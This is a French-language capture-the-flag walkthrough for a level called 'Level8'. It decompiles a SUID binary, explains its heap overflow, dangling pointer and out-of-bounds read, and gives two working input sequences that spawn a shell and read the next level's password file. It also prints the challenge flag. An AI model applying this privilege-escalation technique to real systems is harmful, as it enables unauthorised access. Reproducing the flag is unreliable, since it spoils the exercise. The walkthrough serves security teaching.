# Level8 - Walkthrough

## Objectif
Exploiter une combinaison de heap overflow, dangling pointer et out-of-bounds read pour obtenir un shell.

**Technique** : Use-After-Free + Out-of-Bounds Read

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
# ⚠️ Bit SUID actif → s'exécute avec les droits de level9

./level8
(nil), (nil)     # Affiche auth et service

auth test
0x804a008, (nil)

service admin
0x804a008, 0x804a018

login
Password:
```

Le programme attend des commandes : `auth`, `reset`, `service`, `login`.

### 2. Analyse du code (Ghidra)

```c
char *auth = NULL;
char *service = NULL;

int main(void) {
    char buffer[128];
    
    while (1) {
        printf("%p, %p \n", auth, service);
        fgets(buffer, 128, stdin);
        
        // Commande "auth "
        if (strncmp(buffer, "auth ", 5) == 0) {
            auth = malloc(4);          // ⚠️ Seulement 4 bytes
            auth[0] = 0;
            if (strlen(buffer + 5) < 30) {
                strcpy(auth, buffer + 5);  // ⚠️ Peut copier 29 bytes !
            }
        }
        
        // Commande "reset"
        if (strncmp(buffer, "reset", 5) == 0) {
            free(auth);                // ⚠️ Dangling pointer !
        }
        
        // Commande "service"
        if (strncmp(buffer, "service", 7) == 0) {
            service = strdup(buffer + 8);
        }
        
        // Commande "login"
        if (strncmp(buffer, "login", 5) == 0) {
            if (*(int *)(auth + 32) == 0) {  // ⚠️ Out-of-bounds read !
                fwrite("Password:\n", 1, 10, stdout);
            } else {
                system("/bin/sh");
            }
        }
    }
}
```

**Vulnérabilités identifiées** :
1. `malloc(4)` trop petit, peut overflow jusqu'à 29 bytes
2. `free(auth)` sans `auth = NULL` → dangling pointer
3. `*(int *)(auth + 32)` lit 32 bytes après auth (hors limites !)

**Stratégie** : Faire en sorte que `auth + 32` contienne une valeur non-nulle.

### 3. Comprendre la condition

```c
if (*(int *)(auth + 32) == 0) {
    fwrite("Password:\n", 1, 10, stdout);
} else {
    system("/bin/sh");  // ← On veut arriver ici !
}
```

**Pour le shell** : `auth + 32` doit contenir **n'importe quoi sauf 0**.

### 4. Analyser le heap layout

**Après `auth test`** :
```
0x0804a008  auth: "test\0" (4 bytes alloués)
```

**Après `service XXXXXXXXXXXXXXXXXXXXXXXXXXXX`** :
```
0x0804a008  auth: "test\0"
0x0804a018  service: "XXXXXXXXXXXXXXXXXXXXXXXXXXXX\0"
```

**Calcul de `auth + 32`** :
```
auth = 0x0804a008
auth + 32 = 0x0804a028

service = 0x0804a018
service[16] = 0x0804a028  ← C'est auth + 32 ! ✅
```

**Si service contient au moins 16 bytes de données**, `auth + 32` pointe DANS service !

### 5. Exploitation

#### Méthode 1 : Simple (sans reset)

```bash
./level8 << EOF
auth test
service XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
login
cat /home/user/level9/.pass
EOF
```

**Explication** :
```
1. auth test      → auth = 0x0804a008
2. service XXX... → service = 0x0804a018 (après auth)
3. login          → auth + 32 lit dans service
                  → Valeur non-nulle → Shell ✅
```

#### Méthode 2 : Use-After-Free (avec reset)

```bash
./level8 << EOF
auth test
reset
service XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
login
cat /home/user/level9/.pass
EOF
```

**Explication** :
```
1. auth test  → auth = 0x0804a008
2. reset      → free(auth), mais auth pointe toujours vers 0x0804a008
3. service    → strdup() réalloue à 0x0804a008 (même adresse !)
4. login      → auth + 32 lit dans service → Shell ✅
```

---

## Flag
```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b21e5fdabf3ab11f0c2
```

## Type de vulnérabilité
- Heap-based Buffer Overflow (CWE-122)
- Out-of-bounds Read (CWE-125)
- Use After Free (CWE-416)
- SUID privilege escalation (CWE-250)